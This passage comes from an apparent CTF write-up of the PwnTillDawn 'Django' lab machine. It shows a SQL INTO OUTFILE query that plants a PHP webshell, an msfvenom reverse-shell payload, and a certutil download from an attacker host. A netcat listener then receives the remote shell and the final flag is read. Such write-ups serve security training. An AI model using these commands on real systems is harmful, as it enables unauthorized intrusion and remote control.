+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="s2">&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s2">&#34;C:\\xampp\\htdocs\\backdoor.php&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/post/Django_PwnTillDawn/imgs/6.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="SQL_tab2"
+	
+	
+></p>
+<ol start="3">
+<li>Then, We go the <strong>PHP webshell</strong> place and execute arbitary commands.</li>
+</ol>
+<p><img src="/post/Django_PwnTillDawn/imgs/7.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="php_webshell"
+	
+	
+></p>
+<ol start="4">
+<li>
+<p>After that, We need to upload a <strong>Reverse shell payload</strong> at the victim&rsquo;s machine and then run it to get the <strong>RevShell</strong>.</p>
+</li>
+<li>
+<p>Make the RevShell payload using <strong>MsVenom</strong>.</p>
+</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.66.X.X <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o reverse.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
+</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">7168</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: reverse.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="6">
+<li>Then, Setup a <strong>Python server</strong> to upload that payload in the victim&rsquo;s machine.</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 -m http.server <span class="m">9000</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">9000</span> <span class="o">(</span>http://0.0.0.0:9000/<span class="o">)</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="7">
+<li>Now, Upload the <strong>RevShell</strong> payload using <strong>Certutils.exe</strong>.</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Certutils</span><span class="p">.</span><span class="n">exe</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">certutil</span><span class="p">.</span><span class="n">exe</span> <span class="n">-urlcache</span> <span class="o">-f</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">5</span><span class="p">/</span><span class="n">40564</span><span class="p">.</span><span class="n">exe</span> <span class="n">bad</span><span class="p">.</span><span class="n">exe</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="8">
+<li>Now, We edit it to suit our case and upload the payload.
+<img src="/post/Django_PwnTillDawn/imgs/8.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="certutils.exe"
+	
+	
+></li>
+</ol>
+<p><img src="/post/Django_PwnTillDawn/imgs/9.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="certutils.exe2"
+	
+	
+></p>
+<ol start="9">
+<li>Now, We can setup a <strong>Netcat Listener</strong> and get a <strong>Reverse Shell</strong> after we run the payload.</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nlvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, We run the payload and hopefully we can get the <strong>RevShell</strong>.</p>
+<p><img src="/post/Django_PwnTillDawn/imgs/10.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="revshell"
+	
+	
+></p>
+<ol start="10">
+<li>Boom! We are in!</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">$</span> <span class="n">nc</span> <span class="n">-nlvp</span> <span class="n">4444</span>
+</span></span><span class="line"><span class="cl"><span class="n">listening</span> <span class="n">on</span> <span class="no">[any]</span> <span class="n">4444</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="n">10</span><span class="p">.</span><span class="n">66</span><span class="p">.</span><span class="n">66</span><span class="p">.</span><span class="n">154</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">10</span><span class="p">.</span><span class="n">150</span><span class="p">.</span><span class="n">150</span><span class="p">.</span><span class="n">212</span><span class="p">]</span> <span class="n">49375</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="no">[Version 6.1.7601]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">2009</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span>  <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">&gt;</span><span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">django</span><span class="p">\</span><span class="n">chuck</span><span class="p">.</span><span class="n">norris</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="post-exploitation">Post-Exploitation</h2>
+<p>By navigating through users directory, I have found the last flag <code>FLAG11.txt</code> in Desktop folder of <code>chuck.norris</code> user.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">chuck</span><span class="p">.</span><span class="n">norris</span><span class="p">&gt;</span><span class="nb">cd </span><span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd </span><span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">chuck</span><span class="p">.</span><span class="n">norris</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="n">3829-EAA8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">Directory</span> <span class="n">of</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">chuck</span><span class="p">.</span><span class="n">norris</span><span class="p">\</span><span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">02</span><span class="p">/</span><span class="n">05</span><span class="p">/</span><span class="n">2019</span>  <span class="n">10</span><span class="err">:</span><span class="n">41</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">02</span><span class="p">/</span><span class="n">05</span><span class="p">/</span><span class="n">2019</span>  <span class="n">10</span><span class="err">:</span><span class="n">41</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">..</span>
+</span></span><span class="line"><span class="cl"><span class="n">02</span><span class="p">/</span><span class="n">05</span><span class="p">/</span><span class="n">2019</span>  <span class="n">10</span><span class="err">:</span><span class="n">40</span> <span class="n">AM</span>                <span class="n">40</span> <span class="n">FLAG11</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">               <span class="n">1</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>             <span class="n">40</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl">               <span class="n">2</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>   <span class="n">3</span><span class="p">,</span><span class="n">862</span><span class="p">,</span><span class="n">536</span><span class="p">,</span><span class="n">192</span> <span class="n">bytes</span> <span class="n">free</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">chuck</span><span class="p">.</span><span class="n">norris</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span><span class="nb">type </span><span class="n">FLAG11</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nb">type </span><span class="n">FLAG11</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">7a763d39f68ece1edd10XXXXXXXXXXXXXXXXXXX</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>Pwned</em></p>
+<p><img src="/post/Django_PwnTillDawn/imgs/11.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="pwned"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwntilldawn/">PwnTillDawn</a>
+        
+            <a href="/tags/pentesting/">PenTesting</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+            <a href="/tags/exploit/">Exploit</a>
+        
+            <a href="/tags/vulnerability/">Vulnerability</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/mr.blue-pwntilldawn-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/Mr.Blue_PwnTillDawn/mr.blue_pwntilldawn.JPG" loading="lazy" data-key="" data-hash="/post/Mr.Blue_PwnTillDawn/mr.blue_pwntilldawn.JPG"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Mr.Blue PwnTillDawn Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hollywood-pwntilldawn-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/Hollywood_PwnTillDawn/hollywood_pwntilldawn.JPG" loading="lazy" data-key="" data-hash="/post/Hollywood_PwnTillDawn/hollywood_pwntilldawn.JPG"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Hollywood PwnTillDawn Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/elmariachi-pc-pwntilldawn-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG" loading="lazy" data-key="" data-hash="/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ElMariachi-PC PwnTillDawn Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/redpanda-htb-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/RedPanda_HTB/redpanda_htb.jpg" loading="lazy" data-key="" data-hash="/post/RedPanda_HTB/redpanda_htb.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RedPanda HTB Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/photobomb-htb-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/Photobomb_HTB/photobomb_htb.jpg" loading="lazy" data-key="" data-hash="/post/Photobomb_HTB/photobomb_htb.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Photobomb HTB Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Abdallah Adham
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.12.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#target-information">Target Information</a></li>
+    <li><a href="#scanning">Scanning</a>
+      <ol>
+        <li><a href="#nmap-scanning">Nmap Scanning</a></li>
+      </ol>
+    </li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#ftp-enumeration">FTP Enumeration</a></li>
+        <li><a href="#http-enumeration">HTTP Enumeration</a></li>
+      </ol>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ol>
+        <li><a href="#php-webshell">PHP Webshell</a></li>
+      </ol>
+    </li>
+    <li><a href="#post-exploitation">Post-Exploitation</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
